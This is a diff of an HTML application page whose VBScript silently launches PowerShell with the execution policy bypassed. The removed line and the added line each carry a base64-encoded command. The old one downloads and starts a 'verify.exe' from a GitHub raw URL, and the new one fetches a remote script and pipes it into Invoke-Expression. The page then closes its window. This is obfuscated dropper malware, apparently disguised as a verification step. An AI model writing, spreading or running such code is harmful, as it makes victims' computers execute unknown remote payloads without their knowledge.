@@ -2,7 +2,7 @@
 <script language="VBScript">
 Dim shell
 Set shell = CreateObject("WScript.Shell")
-shell.Run "powershell -ExecutionPolicy Bypass -EncodedCommand aXdyIC1VcmkgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9naW5nb2dhbWluZy1kb3QvZ2FtaW5nLWRvdC5naXRodWIuaW8vbWFpbi92ZXJpZnkuZXhlIiAtT3V0RmlsZSAidmVyaWZ5LmV4ZSI7IFN0YXJ0LVByb2Nlc3MgInZlcmlmeS5leGUi", 0
+shell.Run "powershell -ExecutionPolicy Bypass -e aQB3AHIAIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZwBpAG4AZwBvAGcAYQBtAGkAbgBnAC0AZABvAHQALwB0AGUAcwB0AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhACIAIAB8ACAAaQBlAHgA", 0
 window.close
 </script>
 </html>
